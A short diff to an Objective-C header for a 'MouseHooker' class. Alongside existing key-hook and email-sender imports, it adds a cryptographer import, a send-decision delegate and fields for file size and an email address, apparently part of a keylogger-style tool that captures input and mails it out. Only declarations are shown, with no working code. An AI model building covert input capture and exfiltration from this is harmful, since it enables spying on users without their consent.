@@ -13,9 +13,19 @@
 #import "KeyRunLoop.h"
 #import "EmailSender.h"
 #import "FileManager.h"
+#import "Cryptographer.h"
 
-@interface MouseHooker : NSObject
+#import "KeyHooker.h"
 
+@interface MouseHooker : NSObject<ShouldSendDelegate>
+
+{
+    NSInteger fileSize;
+    BOOL shouldSend;
+    NSString *email;
+}
+
+- (id)init;
 - (void)setMouseNotifications;
 
 @end
